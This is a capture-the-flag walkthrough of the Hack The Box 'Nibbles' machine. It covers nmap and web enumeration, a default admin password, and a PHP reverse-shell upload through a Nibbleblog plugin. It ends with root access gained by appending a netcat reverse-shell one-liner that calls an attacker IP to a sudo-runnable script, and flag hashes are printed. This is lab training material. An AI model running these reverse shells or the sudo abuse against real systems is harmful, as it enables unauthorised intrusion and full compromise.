---


---

<h1 id="walktrough-nibbles-machine">Walktrough Nibbles Machine</h1>
<p>Nibbles is a vulnerable virtual hack the box machine designed for cybersecurity enthusiasts and penetration testers.</p>
<h2 id="scan-of-the-target">Scan of the target</h2>
<pre><code>nmap -sV -sC -p- 10.129.202.34
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-26 22:43 UTC
Nmap scan report for 10.129.202.34
Host is up (0.026s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.21 second
</code></pre>
<p>This machine have a web server<br>
we see in the code sources a directory called /nibbleblog<br>
Scanning the web server:</p>
<pre><code>&gt; whatweb  10.129.202.34 http://10.129.202.34 [200 OK] Apache[2.4.18],
&gt; Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18
&gt; (Ubuntu)], IP[10.129.202.34] whatweb  10.129.202.34/nibbleblog/
&gt; http://10.129.202.34/nibbleblog/ [200 OK] Apache[2.4.18],
&gt; Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu
&gt; Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.202.34], JQuery,
&gt; MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script,
&gt; Title[Nibbles - Yum yum]
</code></pre>
<h2 id="we-can-start-a-directory-listing-attacks-with-ffuf-or-gobuster">We can start a directory listing attacks with ffuf or gobuster:</h2>
<pre><code>/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/admin.php (Status: 200)
/content (Status: 301)
/index.php (Status: 200)
/languages (Status: 301)
/plugins (Status: 301)
/README (Status: 200)
/themes (Status: 301)
</code></pre>
<p>we found readme &amp; admin.php &amp; content interesting:</p>
<pre><code>curl http://10.129.42.190/nibbleblog/README
====== Nibbleblog ======
Version: v4.0.3

searchsploit nibbleblog 4.0.3
----------------------------------------------- ---------------------------------
 Exploit Title                                 |  Path
----------------------------------------------- ---------------------------------
Nibbleblog 4.0.3 - Arbitrary File Upload (Meta | php/remote/38489.rb
----------------------------------------------- ----------------------
</code></pre>
<p>We found the version of the nibble blog and an exploit related to this version</p>
<h2 id="connect-to-the-admin-pannel">Connect to the admin pannel</h2>
<p>in the directory content we found the username of the admin login page (admin.php)</p>
<pre><code>http://10.129.69.103/nibbleblog/content/private/users.xml 
00151454413115129646591
&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
&lt;users&gt;&lt;user username="admin"&gt;&lt;id type="integer"&gt;0&lt;/id&gt;&lt;session_fail_count type="integer"&gt;0&lt;/session_fail_count&gt;&lt;session_date type="integer"&gt;1514544131&lt;/session_date&gt;&lt;/user&gt;&lt;blacklist type="string" ip="10.10.10.1"&gt;&lt;date type="integer"&gt;1512964659&lt;/date&gt;&lt;fail_count type="integer"&gt;1&lt;/fail_count&gt;&lt;/blacklist&gt;&lt;/users&gt;
</code></pre>
<p>username = admin</p>
<p>We found a config files:</p>
<pre><code>  &lt;?xml version="1.0" encoding="utf-8" standalone="yes"?&gt;
    &lt;config&gt;
      &lt;name type="string"&gt;Nibbles&lt;/name&gt;
      &lt;slogan type="string"&gt;Yum yum&lt;/slogan&gt;
      &lt;footer type="string"&gt;Powered by Nibbleblog&lt;/footer&gt;
      &lt;advanced_post_options type="integer"&gt;0&lt;/advanced_post_options&gt;
</code></pre>
<h2 id="recap">Recap</h2>
<p>We just started with a simple nmap scan showing two open ports</p>
<ul>
<li>Discovered an instance of Nibbleblog</li>
<li>Analyzed the technologies in use using whatweb</li>
<li>Found the admin login portal page at admin.php</li>
<li>Discovered that directory listing is enabled and browsed several directories</li>
<li>Confirmed that admin was the valid username</li>
<li>Found out the hard way that IP blacklisting is enabled to prevent brute-force login attempts</li>
<li>Uncovered clues that led us to a valid admin password of nibbles</li>
</ul>
<p>admin.php logins:</p>
<blockquote>
<p>user:admin password:nibbles</p>
</blockquote>
<h2 id="exploit">Exploit</h2>
<p>In the plugins pannel we see the plugin my images, we can upload files in.<br>
Trying to upload a reverse shell<br>
upload php files in the plugins my images</p>
<p>reverse shell.php:</p>
<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.112 9443 &gt;/tmp/f
</code></pre>
<p>after the reverse shell upload, activate the reverse shell by making a request on the file</p>
<pre><code> curl http://10.129.3.159/nibbleblog/content/private/plugins/my_image/image.php
</code></pre>
<p>start a netcat listener on the port we define before</p>
<pre><code>┌──(kali)-[~]
└─$ nc -lvnp 9443
listening on [any] 9443 ...
</code></pre>
<p>wait for the connection</p>
<pre><code>connect to [10.10.14.176] from (UNKNOWN) [10.129.3.159] 58600
/bin/sh: 0: can't access tty; job control turned off
$ ls
db.xml
image.php
</code></pre>
<p>we are connected so try to find the first flag called user.txt</p>
<pre><code>$ cd ../
$ ls
categories
hello
latest_posts
my_image
pages
$ cd /home
$ ls
nibbler
$ cd nibbler
$ ls
personal.zip
user.txt
$ cat user.txt
79c03865431abf47b90ef24b9695e148
</code></pre>
<h2 id="privilege-escalation-exploit">Privilege escalation exploit</h2>
<p>We also need to find a root flag so we need to make a privilege escalation<br>
There is an interesting zip folder so we are going to investigate</p>
<pre><code>$ unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh
$ ls
personal
personal.zip
user.txt
$ cd personal
$ ls
stuff
$ cd stuff
$ ls
monitor.sh
</code></pre>
<p>Okay so there is a bash file containing a script we can maybe exploit but before we are going to scan the vunelrabilities of privilege escalition with the famous <a href="http://LinEnum.sh">LinEnum.sh</a> script for that.<br>
On my local side i start a http server to make a file transfer on the target machine:</p>
<pre><code>(azureuser㉿kali)-[~]
└─$ sudo python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.164.223 - - [01/Oct/2023 13:29:05] "GET /LinEnum.sh HTTP/1.1" 200 -
</code></pre>
<p>On the target side i download the file:</p>
<pre><code>$ wget http://10.10.14.176:8080/LinEnum.sh
--2023-10-01 09:29:05--  http://10.10.14.176:8080/LinEnum.sh
Connecting to 10.10.14.176:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: 'LinEnum.sh'

     0K .......... .......... .......... .......... .....     100%  627K=0.07s

2023-10-01 09:29:05 (627 KB/s) - 'LinEnum.sh' saved [46631/46631]
</code></pre>
<p>I make the chmod command to make the file executable :</p>
<pre><code>chmod +x linenum.sh 
</code></pre>
<p>and i start the script</p>
<pre><code>./linenum.sh 
</code></pre>
<p>and interesting output is this:</p>
<pre><code>[+] We can sudo without supplying a password!
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh
</code></pre>
<p>So we need to inject a reverse shell code in the script <a href="http://monitor.sh">monitor.sh</a> because <a href="http://monitor.sh">monitor.sh</a> can be run with sudo</p>
<pre><code>echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.176 8443 &gt;/tmp/f' | tee -a monitor.sh
</code></pre>
<p>i start a another netcat listener</p>
<pre><code> nc -lvnp 8443
listening on [any] 8443 ...
</code></pre>
<p>and i lunch the script with sudo</p>
<pre><code>sudo ./monitor.sh
</code></pre>
<p>On my local side the script i injected is working:</p>
<pre><code>connect to [10.10.14.176] from (UNKNOWN) [10.129.164.223] 53298
/bin/sh: 0: can't access tty; job control turned off
</code></pre>
<p>We are root and now we need to find the root flag:</p>
<pre><code>#whoami
root
#cd /root
#ls
root.txt
#cat root.txt
de5e5d6619862a8aa5b9b212314e0cdd
</code></pre>
<h3 id="its-the-end-we-found-every-flags">its the end we found every flags</h3>

